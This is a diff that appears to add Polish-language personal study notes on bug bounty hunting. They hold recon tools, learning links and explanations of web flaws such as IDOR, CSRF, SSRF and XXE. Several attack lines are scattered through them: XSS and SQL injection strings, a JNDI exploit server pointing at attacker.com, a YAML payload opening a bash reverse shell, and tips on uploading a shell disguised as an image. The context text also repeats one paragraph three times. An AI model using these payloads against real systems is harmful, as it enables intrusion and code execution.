@@ -1072,3 +1072,781 @@ https://www.orangecyberdefense.com/global/blog/ethical-hacking/ethical-hacking-a
 **Wyodrębnianie sekretów z zaszyfrowanych maszyn wirtualnych**:
 AMD SEV to sprzętowe rozszerzenie szyfrowania pamięci głównej w systemach z wieloma dzierżawcami. SEV wykorzystuje wbudowany koprocesor, AMD Secure Processor, do przezroczystego szyfrowania pamięci maszyny wirtualnej za pomocą indywidualnych, efemerycznych kluczy, które nigdy nie opuszczają koprocesora. Celem jest ochrona poufności pamięci dzierżawców przed złośliwym lub zagrożonym hypervisorem oraz przed atakami na pamięć, na przykład poprzez zimny rozruch lub DMA. Atak SEVered pokazał, że hiperwizor może jednak wyodrębnić pamięć w postaci zwykłego tekstu z maszyn wirtualnych zaszyfrowanych SEV bez dostępu do ich kluczy szyfrujących. Jednak szyfrowanie utrudnia tradycyjnym technikom introspekcji maszyny wirtualnej lokalizowanie sekretów w pamięci przed wyodrębnieniem. Może to wymagać wyodrębnienia dużej ilości pamięci w celu odzyskania określonych sekretów, a tym samym skutkować czasochłonnym, oczywistym atakiem. Przedstawiamy podejście, które umożliwia złośliwemu hypervisorowi szybką identyfikację i kradzież tajemnic, takich jak klucze TLS, SSH czy FDE, z zaszyfrowanych maszyn wirtualnych na obecnym sprzęcie SEV. Najpierw obserwujemy aktywność maszyny wirtualnej z poziomu hiperwizora, aby wywnioskować, które obszary pamięci najprawdopodobniej zawierają sekrety. Następnie systematycznie wyodrębniamy te obszary pamięci i na bieżąco analizujemy ich zawartość. Pozwala to na skuteczne odzyskiwanie ukierunkowanych tajemnic, znacznie zwiększając szanse na szybką, solidną i ukrytą kradzież. Klucze SSH lub FDE z zaszyfrowanych maszyn wirtualnych na obecnym sprzęcie SEV. Najpierw obserwujemy aktywność maszyny wirtualnej z poziomu hiperwizora, aby wywnioskować, które obszary pamięci najprawdopodobniej zawierają sekrety. Następnie systematycznie wyodrębniamy te obszary pamięci i na bieżąco analizujemy ich zawartość. Pozwala to na skuteczne odzyskiwanie ukierunkowanych tajemnic, znacznie zwiększając szanse na szybką, solidną i ukrytą kradzież. Klucze SSH lub FDE z zaszyfrowanych maszyn wirtualnych na obecnym sprzęcie SEV. Najpierw obserwujemy aktywność maszyny wirtualnej z poziomu hiperwizora, aby wywnioskować, które obszary pamięci najprawdopodobniej zawierają sekrety. Następnie systematycznie wyodrębniamy te obszary pamięci i na bieżąco analizujemy ich zawartość. Pozwala to na skuteczne odzyskiwanie ukierunkowanych tajemnic, znacznie zwiększając szanse na szybką, solidną i ukrytą kradzież.
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# bug bounty
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+rekonesans:
+* * *https://securityheaders.com/
+* * *https://threatcrowd.org/
+* * *https://publicwww.com/
+* * *http://ipv4info.com/
+* * *https://pentest-tools.com/
+* * *netcraft
+* * *https://osint.sh/
+
+luki w zabezpieczeniach:
+XSS: `<script>alert(document.domain)</script>`
+https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#
+
+metadane exif nie są usuwane z profilu [POC]: http://exif.regex.info/ 
+**Przykład**: https://youtu.be/LtQO4aRpzx8
+
+**atak ddos przez nie ustalenie limitu hasła**
+
+SQL injection przykłąd: `https://test.com/productskategoria=gifty'+OR+1=1--`
+panel administratora SQL: `admin' #`
+
+Luka w zabezpieczeniach omijania adresu email:https://youtu.be/ow3lT0Kmi-I
+
+Xmlrpc.php bruteforce: https://youtu.be/r5ToGBIZRI0
+
+NAUKA github/youtube/google:
+https://github.com/nahamsec/Resources-for-Beginner-Bug-Bounty-Hunters
+https://github.com/EdOverflow/bugbounty-cheatsheet
+https://github.com/djadmin/awesome-bug-bounty#getting-started
+https://bughunters.google.com/
+https://github.com/HolyBugx/HolyTips/tree/main/
+https://github.com/CHYbeta/Web-Security-Learning
+https://github.com/m0chan/BugBounty
+
+WAZNE NAUKA:
+https://github.com/5bhuv4n35h/pentestmindmap
+https://github.com/pdelteil/BugBountyReportTemplates
+https://github.com/infosecn1nja/AD-Attack-Defense
+
+
+narzędzia:
+* https://github.com/m4ll0k/BBTz
+* wfuzz
+* dirsearch
+* nmap
+* burpsuite
+* wpscan
+*  subzy =  sudo su`subzy -targets /home/kali/Desktop/sql.txt | tee -a subzy.txt` (**komenda**)
+
+najlepsze ze strony https://medium.com/:
+https://medium.com/bug-bounty-hunting/coping-up-with-bug-bounty-failures-7d9ca4e6d257
+https://medium.com/@santocheung/basic-csrf-8e135c6e2b0d
+https://medium.com/@circleninja
+https://medium.com/@santocheung/
+
+**ProxyShell składa się z 3 luk**
+
+## Wszystkie luki CVE: https://cve.mitre.org/
+
+## REECON CAŁEJ STRONY:
+`cd reconftw`
+`sudo proxychains ./reconftw.sh -d NAZWA-STRONA -r` 
+
+znaleziona luka sql https://www.jhaddix.com/post/bug-bounty-hacking-diary-4-8-22
+
+**Pełna metodologia przejęcia subdomeny (narzędzie** **SUBZY**)
+https://youtu.be/xQVE3yybti0
+
+KOMENDY: `subzy -target NAZWA SUBDOMENY`
+
+`subzy -targets /home/kali/Desktop/sql.txt | tee -a subzy.txt`
+
+https://medium.com/@nynan/what-i-learnt-from-reading-217-subdomain-takeover-bug-reports-c0b94eda4366
+
+XSStrike:
+`XSSTRIKE - proxychains python3 xsstrike.py -u "strona.com/parametr typu id"`
+
+`proychains ./xsstrike.py -u "http://URL/" --crawl`
+
+WSZYSTKIE PRZKŁAY: https://github.com/s0md3v/XSStrike/wiki/Usage
+
+test api: **cd gmascapiscanner**
+`python3 maps_api_scanner_python3.py --api-key API`
+
+## **## JAK NAJMNIEJ AUTOMATYZACJI**
+
+domain extractor - https://beautifycode.net/domain-extractor
+
+
+![2022-04-21 15_21_55-Bug-Bounty-Playbook.pdf — Osobisty — Microsoft​ Edge.png](:/6cf7b6a198d144c7bc51966d27c5f65a)
+
+
+Jeśli zobaczysz stronę Apache Struts, możesz spróbować niektórych znanych CVE, lista jest długa.
+luki w zabezpieczeniach. Na przykład, jeśli widzisz, że witryna korzysta z WordPressa, możesz uruchomić skaner WordPress.
+
+
+Serwer bazy danych odpowiada za wiele funkcji, w tym za odczytywanie, wyszukiwanie i zapisywanie do bazy danych. Aplikacja internetowa do zakupów online może wymagać dostępu do więcej niż jednej bazy danych, na przykład:
+
+* * ***Baza produktów**: ta baza danych zawiera szczegółowe informacje o produktach, takie jak nazwa, zdjęcia, specyfikacje i cena.
+* * ***Baza klientów**: zawiera wszystkie szczegóły związane z klientami, takie jak imię i nazwisko, adres, e-mail i numer telefonu.
+* * ***Baza danych sprzedaży:** Oczekujemy, że w tej bazie danych zobaczymy, co kupił każdy klient i jak zapłacił.
+
+
+
+Poniższy obraz przedstawia wyszukiwanie produktu w witrynie zakupów online. W najprostszej wersji wyszukiwanie obejmie cztery kroki:
+
+
+![2022-05-13 21_12_08-SpróbujHackMe _ Bezpieczeństwo aplikacji internetowych.png](:/cfe31d7aa4f64790ba27c80659d9201c)
+
+Użytkownik wprowadza nazwę przedmiotu lub powiązane słowa kluczowe w polu wyszukiwania. Przeglądarka internetowa wysyła słowa kluczowe wyszukiwania do aplikacji internetowej zakupów online.
+Aplikacja internetowa przeszukuje (przeszukuje) bazę produktów pod kątem wprowadzonych słów kluczowych.
+Baza produktów zwraca wyniki wyszukiwania pasujące do podanych słów kluczowych do aplikacji internetowej.
+Aplikacja internetowa formatuje wyniki jako przyjazną stronę internetową i zwraca je użytkownikowi.
+
+![b5459db6d49897741f063cb33711e4c0.png](:/1dcdf4cd165e48eaa7af93fe5e19bff7)
+
+**luka IDOR może wystąpić, jeśli dane wejściowe wzbudziły zbyt duże zaufanie. Innymi słowy, aplikacja internetowa nie sprawdza, czy użytkownik ma uprawnienia dostępu do żądanego obiektu.**
+
+**Rozważmy bardziej krytyczny przykład; adres URL https://store.tryhackme.thm/customers/user?id=16zwróciłby użytkownika z id=16. Ponownie oczekujemy, że użytkownicy będą mieli kolejne numery identyfikacyjne. Atakujący próbowałby wypróbować inne numery i prawdopodobnie uzyskać dostęp do innych kont użytkowników. Ta luka może działać z plikami sekwencyjnymi; na przykład, jeśli atakujący widzi 007.txt, może wypróbować inne liczby, takie jak 001.txt, 006.txti 008.txt**
+
+----------------------------------------------------------------------
+**Java Naming and Directory Interface (JNDI) to Java API, które umożliwia klientom wykrywanie i wyszukiwanie danych i obiektów za pomocą nazwy. Obiekty te mogą być przechowywane w różnych usługach nazewniczych lub katalogowych, takich jak Remote Method Invocation (RMI), Common Object Request Broker Architecture (CORBA), Lightweight Directory Access Protocol (LDAP) lub Domain Name Service (DNS).**
+**Innymi słowy, JNDI jest prostym interfejsem API Java (takim jak „InitialContext.lookup(String name)” ), który przyjmuje tylko jeden parametr ciągu, a jeśli ten parametr pochodzi z niezaufanego źródła, może prowadzić do zdalnego wykonania kodu przez zdalną klasę Ładowanie.**
+**Kiedy nazwa żądanego obiektu jest kontrolowana przez atakującego, możliwe jest skierowanie ofiary aplikacji Java do złośliwego serwera rmi/ldap/corba i odpowiedź z dowolnym obiektem. Jeśli ten obiekt jest instancją klasy „javax.naming.Reference”, klient JNDI próbuje rozpoznać atrybuty „classFactory” i „classFactoryLocation” tego obiektu. Jeśli wartość „classFactory” jest nieznana docelowej aplikacji Java, Java pobiera kod bajtowy fabryki z lokalizacji „classFactoryLocation” za pomocą URLClassLoader Java.**
+
+Przykłąd podatnej aplikacji:
+```
+@RequestMapping("/lookup")
+	@Example(uri = {"/lookup?name=java:comp/env"})
+	public Object lookup(@RequestParam String name) throws Exception{
+	    return new javax.naming.InitialContext().lookup(name);
+	}
+```
+
+Wykorzystanie wstrzyknięć JNDI przed JDK 1.8.0_191
+Żądając adresu URL „/lookup/?name=ldap://127.0.0.1:1389/Object” możemy sprawić, że podatny serwer połączy się z naszym kontrolowanym adresem. Aby wyzwolić zdalne ładowanie klasy, złośliwy serwer RMI może odpowiedzieć za pomocą następującego odniesienia:
+
+public class EvilRMIServer {
+    public static void main(String[] args) throws Exception {
+        System.out.println("Creating evil RMI registry on port 1097");
+        Registry registry = LocateRegistry.createRegistry(1097);
+ 
+  ```
+//creating a reference with 'ExportObject' factory with the factory location of 'http://_attacker.com_/'
+        Reference ref = new javax.naming.Reference("ExportObject","ExportObject","http://_attacker.com_/");
+ 
+        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
+        registry.bind("Object", referenceWrapper);
+    }
+}
+```
+Ponieważ "ExploitObject" jest nieznany serwerowi docelowemu, jego kod bajtowy zostanie załadowany i wykonany z " http://_attacker.com_/ExploitObject.class ", wyzwalając RCE.
+---------------------------------------------------
+Luka IDOR może wystąpić, gdy serwer sieciowy otrzymuje dane wejściowe dostarczone przez użytkownika w celu pobrania obiektów (plików, danych, dokumentów), a do tych danych 
+wejściowych zostało zbyt duże zaufanie, a aplikacja sieciowa nie weryfikuje, czy użytkownik powinien, w mieć dostęp do żądanego obiektu
+
+Komponent zapytania:
+Dane komponentu zapytania są przekazywane w adresie URL podczas wysyłania zapytania do strony internetowej. Weźmy na przykład poniższy zrzut ekranu adresu URL.
+
+![96ca5139d906961178a2ef917850f96d.png](:/c5e8025f1d634882875987cfa2b44bde)
+
+- Protokół:  https://
+- Domena: website.thm
+- Strona:  /profil
+- Komponent zapytania:  id=23
+
+Zmienne postu:
+
+Badanie zawartości formularzy na stronie internetowej może czasami ujawnić pola, które mogą być podatne na wykorzystanie IDOR. Weźmy na przykład poniższy kod HTML dla formularza, który aktualizuje hasło użytkownika.
+
+```
+<form method="POST" action="/update-password">
+   <input type="hidden" name"user_id" value="123">
+    <div>New Password:</div>
+    <div><input type="password" name="new_password"></div>
+    <div><input type="submit" value="Change Password">
+</form>
+```
+
+Z podświetlonej linii widać(input type="hidden" name"user_id" value="123">), że identyfikator użytkownika jest przekazywany do serwera WWW w ukrytym polu Zmiana wartości tego pola z 123 na inny user_id może skutkować zmianą hasła do konta innego użytkownika/
+
+omijanie autoryzacji 403:
+narzędzie: byp4xx
+komenda - proxychains python3 ./byp4xx.py -fuzz https://example.com/
+
+https://github.com/swisskyrepo/PayloadsAllTheThings
+
+nikto -host example.com
+
+Niebezpieczne parsowanie YAML może umożliwić tworzenie obiektów Pythona i w rezultacie zdalne wykonanie kodu:
+`!!python/object/apply:os.system ["bash -i >& /dev/tcp/yourIP/4444 0>&1"]`
+
+dirbuster -u http://10.10.23.135 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+
+https://www.immuniweb.com
+
+https://kalilinuxtutorials.com/subfinder/ (DOCKER)
+
+
+
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+wykonanie polecenia¶
+Gdy aplikacja musi wywołać zewnętrzne programy w celu przetworzenia treści, użyje niektórych funkcji do wykonania poleceń systemowych. systemNa przykład , exec, itp. w PHP shell_exec, gdy użytkownik może kontrolować parametry funkcji wykonywania poleceń, złośliwe polecenia systemowe mogą zostać wstrzyknięte do zwykłych poleceń, co skutkuje atakami polegającymi na wykonywaniu poleceń. Tutaj skupiamy się głównie na PHP, aby wprowadzić luki w wykonywaniu poleceń, a szczegóły dotyczące Javy i innych aplikacji mają zostać dodane.
+
+plik zawiera¶
+Jeśli klientowi zezwoli się na wprowadzanie i kontrolowanie plików dynamicznie umieszczanych na serwerze, doprowadzi to do wykonania złośliwego kodu i ujawnienia poufnych informacji, w tym głównie dwóch form dołączania plików lokalnych i dołączania plików zdalnych.
+
+CSRF Fałszowanie żądań między witrynami¶
+Cross-Site Request Forgery (CSRF) to atak, który powoduje, że zalogowany użytkownik wykonuje akcję bez jego wiedzy. Ponieważ atakujący nie może zobaczyć wyniku odpowiedzi na sfałszowane żądanie, ataki CSRF służą przede wszystkim do wykonywania działań, a nie do kradzieży danych użytkownika. Gdy ofiarą jest zwykły użytkownik, CSRF może realizować operacje takie jak przelewanie środków użytkownika i wysyłanie e-maili bez jego wiedzy, ale jeśli ofiarą jest użytkownik z uprawnieniami administratora, CSRF może zagrozić bezpieczeństwu całego systemu WEB.
+
+Fałszowanie żądań po stronie serwera SSRF¶
+SSRF (Server-Side Request Forgery: fałszowanie żądań po stronie serwera) to luka w zabezpieczeniach stworzona przez atakującego w celu utworzenia żądania zainicjowanego przez serwer. Zazwyczaj ataki SSRF są ukierunkowane na systemy wewnętrzne, które są niedostępne z sieci zewnętrznej.
+
+Udostępnianie pliku¶
+W trakcie działania serwisu nieunikniona jest aktualizacja niektórych stron lub treści serwisu, w tym czasie konieczne jest skorzystanie z funkcji przesyłania plików serwisu. Jeśli przesyłane pliki nie są objęte ograniczeniami lub ograniczenia są pomijane, funkcja ta może służyć do przesyłania plików wykonywalnych i skryptów na serwer, co dodatkowo spowoduje awarię serwera.
+
+przechwytywanie kliknięć¶
+Clickjacking został zapoczątkowany w 2008 roku przez ekspertów ds. Bezpieczeństwa internetowego Roberta Hansena i Jeremiaha Glusmana.
+
+Jest to wizualna metoda oszustwa.Po stronie WEB ramka iframe zagnieżdża przezroczystą i niewidoczną stronę, umożliwiając użytkownikowi kliknięcie pozycji, w której atakujący chce oszukać użytkownika, aby kliknął bez wiedzy.
+
+Ze względu na pojawienie się clickjackingu istnieje metoda zagnieżdżania zapobiegająca ramkom, ponieważ clickjacking wymaga do ataku zagnieżdżonych stron iframe.
+
+Poniższy kod jest najczęstszym przykładem zapobiegania zagnieżdżaniu ramek:
+
+
+if(top.location!=location)
+    top.location=self.location;
+Wirtualny prywatny serwer VPS¶
+Technologia VPS (Virtual Private Server) to wysokiej jakości usługa, która dzieli serwer na wiele wirtualnych serwerów prywatnych. Technologia realizacji VPS dzieli się na technologię kontenerową i technologię wirtualizacji. W kontenerze lub maszynie wirtualnej każdemu VPS można przypisać niezależny publiczny adres IP, niezależny system operacyjny i przeprowadzić izolację miejsca na dysku, pamięci, zasobów procesora, procesów i konfiguracji systemu między różnymi VPS, symulując wyłączne użycie do użytkownicy i aplikacje Doświadczenie w korzystaniu z zasobów obliczeniowych. Podobnie jak samodzielny serwer, VPS może samodzielnie przeinstalować system operacyjny, zainstalować programy i zrestartować serwer. VPS zapewnia użytkownikom swobodę zarządzania i konfiguracji oraz może być używany do wirtualizacji przedsiębiorstwa i dzierżawy zasobów IDC.
+
+Dzierżawa zasobów IDC zapewniana przez dostawcę VPS. Ze względu na różnice w sprzęcie, oprogramowaniu VPS i strategiach sprzedaży stosowanych przez różnych dostawców VPS, doświadczenie korzystania z VPS jest również zupełnie inne. Szczególnie, gdy dostawca VPS jest wyprzedany, a serwer fizyczny jest przeciążony, wydajność VPS będzie znacznie ograniczona. Relatywnie rzecz biorąc, technologia kontenerowa jest bardziej wydajna pod względem wykorzystania sprzętu niż technologia maszyn wirtualnych i łatwiej jest ją przecenić, więc ogólnie rzecz biorąc, cena VPS kontenerowego jest niższa niż VPS maszyny wirtualnej.
+
+konkurs warunkowy¶
+Warunkowa luka w zabezpieczeniach konkurencji jest luką po stronie serwera.Ponieważ po stronie serwera przetwarzane są żądania różnych użytkowników jednocześnie, jeśli współbieżność nie jest odpowiednio obsługiwana lub logiczna sekwencja powiązanych operacji nie jest odpowiednio zaprojektowana, takie problemy wystąpią.
+
+XXE¶
+XXE Injection oznacza XML External Entity Injection, znany również jako XML External Entity Injection Attack.Luka w zabezpieczeniach to problemy z bezpieczeństwem powstające podczas przetwarzania niezabezpieczonych danych podmiotu zewnętrznego.
+
+W standardzie XML 1.0 pojęcie bytu (podmiotu) jest zdefiniowane w strukturze dokumentu XML. Podmiot można wywołać w dokumencie poprzez predefiniowanie, a identyfikator podmiotu może uzyskać dostęp do treści lokalnych lub zdalnych. Jeśli „zanieczyszczenie „Wprowadza się w tym procesie” źródło, po przetworzeniu dokumentu XML, może to prowadzić do problemów związanych z bezpieczeństwem, takich jak wyciek informacji.
+
+XSCH¶
+Ze względu na zaniedbania twórców stron internetowych w procesie tworzenia z wykorzystaniem Flasha, Silverlight itp., problem wystąpił z powodu braku poprawnej konfiguracji pliku zasad międzydomenowych (crossdomain.xml). Na przykład:
+
+
+<cross-domain-policy>
+    <allow-access-from domain=“*”/>
+</cross-domain-policy>
+Ponieważ plik zasad międzydomenowych jest skonfigurowany jako *, oznacza to, że Flash w dowolnej domenie może z nim wchodzić w interakcje, co daje możliwość inicjowania żądań i uzyskiwania danych.
+
+Overreach (brak dostępu na poziomie funkcji)¶
+Luka w zabezpieczeniach umożliwiająca naruszenie uprawnień jest powszechną luką w zabezpieczeniach aplikacji WEB. Jego zagrożenie polega na tym, że jedno konto może kontrolować dane użytkowników całej witryny. Oczywiście dane te są ograniczone do danych odpowiadających funkcjom z lukami. Główną przyczyną nieautoryzowanej luki w zabezpieczeniach jest to, że programista nadmiernie ufał danym żądanym przez klienta podczas dodawania, usuwania, modyfikowania i wysyłania zapytań do danych i nie trafił w osąd organu. Dlatego testowanie nieautoryzowanego dostępu to proces ciężkiej pracy z programistami.
+
+Wyciek wrażliwych informacji¶
+Informacje wrażliwe odnoszą się do informacji, które nie są znane opinii publicznej, mają rzeczywistą i potencjalną wartość użytkową i wyrządzają szkodę społeczeństwu, przedsiębiorstwom lub osobom fizycznym w przypadku ich utraty, niewłaściwego wykorzystania lub uzyskania do nich dostępu bez zezwolenia. W tym: informacje dotyczące prywatności, informacje dotyczące działalności biznesowej, informacje finansowe, informacje dotyczące personelu, informacje dotyczące obsługi i konserwacji IT itp. Kanały wycieku obejmują Github, bibliotekę Baidu, kod Google, katalogi stron internetowych itp.
+
+zła konfiguracja zabezpieczeń¶
+Błędna konfiguracja zabezpieczeń: czasami użycie domyślnej konfiguracji zabezpieczeń może narazić aplikację na wiele ataków. Bardzo ważne jest, aby istniejące najlepsze konfiguracje zabezpieczeń były używane we wdrożonych aplikacjach, serwerach WWW, serwerach baz danych, systemach operacyjnych, bibliotekach kodu i wszystkich komponentach związanych z aplikacjami.
+
+zażądać przemytu¶
+W protokole HTTP istnieją dwa nagłówki określające koniec żądania, a mianowicie Content-Length i Transfer-Encoding. W złożonym środowisku sieciowym różne serwery wdrażają standardy RFC na różne sposoby. W związku z tym dla tego samego żądania HTTP różne serwery mogą generować różne wyniki przetwarzania, co stwarza zagrożenie dla bezpieczeństwa.
+
+zatrucie TLS¶
+W protokole TLS istnieje mechanizm multipleksowania sesji. Gdy klient obsługujący ten typ funkcji uzyskuje dostęp do złośliwego serwera TLS, klient przechowuje sesję wysłaną przez złośliwy serwer. Gdy klient ponownie wykorzystuje sesję, DNS Rebinding może zrealizować pozwalając klient wysyła złośliwe Sesje do usług intranetowych, osiągając w ten sposób efekt ataków SSRF, w tym możliwość dowolnego zapisu do usług intranetowych, takich jak Memcached, a następnie współpracuje z innymi lukami w celu spowodowania RCE i innych zagrożeń.
+
+XS-przecieki¶
+Wycieki typu cross-site scripting (znane również jako XS-Leaks/XSLeaks) to rodzaj luki wywodzącej się z wbudowanego kanału bocznego platformy internetowej. Zasada polega na wykorzystaniu tego bocznego kanału w sieci do ujawnienia poufnych informacji o użytkowniku, takich jak dane użytkownika w innych aplikacjach sieciowych, informacje o lokalnym środowisku użytkownika lub informacje o sieci wewnętrznej, z którą użytkownik jest połączony.
+
+Atak wykorzystuje podstawową zasadę platformy internetowej — możliwość komponowania, która umożliwia stronom interakcję ze sobą i nadużywanie legalnych mechanizmów w celu uzyskania informacji o użytkownikach. Główna różnica między tym atakiem a technologią cross-site request forgery (CSRF) polega na tym, że XS-Leaks nie fałszuje żądań użytkownika w celu wykonania operacji, ale jest używany do wnioskowania i uzyskiwania informacji o użytkowniku.
+
+Przeglądarki udostępniają różnorodne funkcje wspierające interakcję między różnymi aplikacjami internetowymi; na przykład przeglądarki umożliwiają jednej stronie ładowanie podzasobów, nawigację lub wysyłanie wiadomości do innej aplikacji. Podczas gdy te zachowania są zwykle ograniczone przez mechanizmy bezpieczeństwa platform internetowych (takie jak polityka tego samego pochodzenia), XS-Leaks wykorzystuje różne zachowania podczas interakcji między stronami internetowymi w celu ujawnienia informacji o użytkownikach.
+
+WAF¶
+System ochrony aplikacji internetowych (znany również jako: system zapobiegania włamaniom na poziomie aplikacji internetowej. Angielski: Web Application Firewall, dalej: WAF). Używając uznanego na całym świecie stwierdzenia: Zapora aplikacji WEB to produkt, który zapewnia ochronę aplikacji WEB poprzez wdrożenie szeregu zasad bezpieczeństwa dla HTTP/HTTPS.
+
+IDS¶
+IDS to skrót od Intrusion Detection Systems w języku angielskim i oznacza „Intrusion Detection System” w języku chińskim. Profesjonalnie rzecz biorąc, zgodnie z określoną strategią bezpieczeństwa, za pomocą oprogramowania i sprzętu, monitoruj stan działania sieci i systemu oraz wykrywaj różne próby ataków, zachowania ataków lub wyniki ataków w jak największym stopniu, aby zapewnić poufność i integralność zasoby systemu sieciowego i dostępność. Zrób metaforę obrazu: jeśli zapora ogniowa jest zamkiem w drzwiach budynku, to system IDS jest systemem monitoringu w tym budynku. Gdy złodziej wejdzie do budynku przez okno lub osoba z wewnątrz przekroczy granicę, tylko system monitoringu w czasie rzeczywistym może wykryć sytuację i wydać ostrzeżenie.
+
+IPS¶
+Intrusion Prevention System (IPS: Intrusion Prevention System) to narzędzie zabezpieczające sieć komputerową oraz uzupełnienie oprogramowania antywirusowego (programy antywirusowe) i zapory ogniowej (Filtr pakietów, Application Gateway). System zapobiegania włamaniom (system zapobiegania włamaniom) to urządzenie zabezpieczające sieć komputerową, które może monitorować zachowanie transmisji danych sieciowych w sieci lub sprzęcie sieciowym i może natychmiast przerywać, dostosowywać lub izolować niektóre nieprawidłowe lub szkodliwe zachowania transmisji danych w sieci.
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+
+
+DIRSEARCH -  dirsearch -u 10.10.120.28  -e / -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50/lub 10 -b -r -f
+
+subdomains - https://subdomains.whoisxmlapi.com/
+
+
+Podczas przesyłania pliku do „partners.line.me” z nazwą pliku zawierającą ładunek XSS, serwer nie zmienił nazwy pliku. To spowodowało, że XSS oparty na DOM został osadzony w HTML. Przesłane pliki były przechowywane tylko przez określony czas. Jednak dopóki były dostępne na serwerze, dostęp do ścieżki wyzwalał XSS, a zapisany ładunek był wyświetlany bez ucieczki. Okazało się jednak, że kradzież ciasteczek nie jest możliwa.
+
+
+Self XSS To xss który widzisz tylko ty.
+Przykład - https://whitton.io/articles/uber-turning-self-xss-into-good-xss/
+
+Wydaję mi się że ładunek xss w plkach lub zdjęciach jest w ten sposób przesyłany. Włączony Burp Suite --> Wysłanie norlamnego pliku/Zdjęcia na stronę --> Przechwycenie żądania i zmienienie nazwy pliku na payload XSS
+https://whitton.io/articles/xss-on-facebook-via-png-content-types/
+
+NAUKA - https://www.hacksplaining.com/
+                https://www.amanhardikar.com/mindmaps/Practice.html
+				https://forum.bugcrowd.com/t/researcher-resources-tutorials/370
+				https://www.reddit.com/r/netsec/
+
+https://forum.bugcrowd.com/t/researcher-resources-bounty-bug-write-ups/1137
+				
+https://www.bugcrowd.com/blog/getting-started-bug-bounty-hunter-methodology/
+				
+https://forum.bugcrowd.com/t/researcher-resources-how-to-become-a-bug-bounty-hunter/1102
+
+dns tool - https://code.google.com/archive/p/dns-discovery/
+
+https://dnsdumpster.com/
+
+
+przesyłanie odwróconej powłoki do witryny w miejscu gdzie jest przeznaczone przesyłanie zdjęć:
+
+mogę przesłać plik img, png. Mogę zmienić rozszerzenie na .php7.
+
+Nie mogę po prostu przesłać pliku .php7, ale działa to, gdy konwertuję zwykły plik jpg na plik .php7
+
+https://github.com/sAjibuu/upload_bypass
+///Najprawdopodobniej po stronie serwera sprawdzają, czy jest to obraz. Użyj edytora szesnastkowego i umieść odpowiednie tagi w kodzie. Po prostu google i eksperymentuj. Następnie możesz zrobić dowolne rozszerzenie.\\\
+
+-----------------------------------------------------------------------
+## **RECON**
+Koncepcje tła
+Poziomy są ważną koncepcją dla tego dokumentu i dla PTES jako całości. Jest to swego rodzaju model dojrzałości dla pentestów. Definiowanie poziomów pozwala nam sprecyzować oczekiwane wyniki i działania w ramach pewnych rzeczywistych ograniczeń, takich jak czas, wysiłek, dostęp do informacji itp.
+
+Poziomy zbierania danych wywiadowczych są obecnie podzielone na trzy kategorie, a dla każdej z nich podano typowy przykład. Powinny one kierować dodawaniem technik w poniższym dokumencie. Na przykład intensywna czynność, taka jak utworzenie profilu na Facebooku i analiza sieci społecznościowej celu, jest odpowiednia w bardziej zaawansowanych przypadkach i powinna być oznaczona odpowiednim poziomem. Zobacz mapę myśli poniżej, aby zobaczyć przykłady.
+
+Zbieranie informacji poziomu 1
+(pomyśl: Napędzany zgodnością) Głównie proces zbierania informacji za pomocą kliknięcia przycisku. Ten poziom informacji można uzyskać prawie wyłącznie za pomocą zautomatyzowanych narzędzi. Absolutne minimum, aby powiedzieć, że zrobiłeś IG dla PT.
+
+Acme Corporation musi być zgodna z PCI / FISMA / HIPAA. Wysiłek w zakresie gromadzenia informacji na poziomie 1 powinien być odpowiedni do spełnienia wymogu zgodności.
+
+Zbieranie informacji na poziomie 2
+(pomyśl: najlepsza praktyka) Ten poziom można utworzyć za pomocą zautomatyzowanych narzędzi z poziomu 1 i ręcznej analizy. Dobre zrozumienie firmy, w tym informacji, takich jak fizyczna lokalizacja, relacje biznesowe, schemat organizacyjny itp.
+
+Firma Widgets Inc musi działać zgodnie z PCI, ale jest zainteresowana długoterminową strategią bezpieczeństwa i przejmuje kilku mniejszych producentów widżetów. Wysiłek w zakresie gromadzenia informacji na poziomie 2 powinien być odpowiedni do ich potrzeb.
+
+Zbieranie informacji na poziomie 3
+(pomyśl: sponsorowany przez państwo) Bardziej zaawansowany pentest, Redteam, pełny zakres. Wszystkie informacje z poziomu 1 i poziomu 2 wraz z wieloma ręcznymi analizami. Pomyśl o kultywowaniu relacji w SocNet, ciężkiej analizie, głębokim zrozumieniu relacji biznesowych, najprawdopodobniej dużej liczbie godzin na zebranie i korelację.
+
+Zespół Armii Czerwonej ma za zadanie przeanalizować i zaatakować segment sieci armii w obcym kraju, aby znaleźć słabe punkty, które mogłyby zostać wykorzystane przez cudzoziemca. W tym przypadku odpowiednie byłoby podjęcie działań w zakresie gromadzenia informacji na poziomie 3.
+
+Zdobywanie informacji
+Co to jest
+Intelligence Gathering przeprowadza rekonesans przeciwko celowi, aby zebrać jak najwięcej informacji, które można wykorzystać podczas penetracji celu podczas oceny podatności i faz eksploatacji. Im więcej informacji uda Ci się zebrać w tej fazie, tym więcej wektorów ataku możesz wykorzystać w przyszłości.
+
+Wywiad typu open source (OSINT) to forma zarządzania zbiorami danych wywiadowczych, która obejmuje wyszukiwanie, selekcję i pozyskiwanie informacji z publicznie dostępnych źródeł oraz analizowanie ich w celu uzyskania użytecznych informacji. [1]
+
+Po co to robić
+Przeprowadzamy gromadzenie danych Open Source Intelligence w celu określenia różnych punktów wejścia do organizacji. Te punkty wejścia mogą być fizyczne, elektroniczne i/lub ludzkie. Wiele firm nie bierze pod uwagę, jakie informacje o sobie udostępniają publicznie i jak te informacje mogą zostać wykorzystane przez zdeterminowanego atakującego. Ponadto wielu pracowników nie bierze pod uwagę, jakie informacje o sobie umieszczają publicznie i jak te informacje mogą zostać wykorzystane do zaatakowania ich samych lub ich pracodawcy.
+
+Co to nie jest
+OSINT może nie być dokładny lub aktualny. Źródła informacji mogą być celowo/przypadkowo zmanipulowane w celu odzwierciedlenia błędnych danych, informacje mogą stać się przestarzałe w miarę upływu czasu lub po prostu być niekompletne.
+
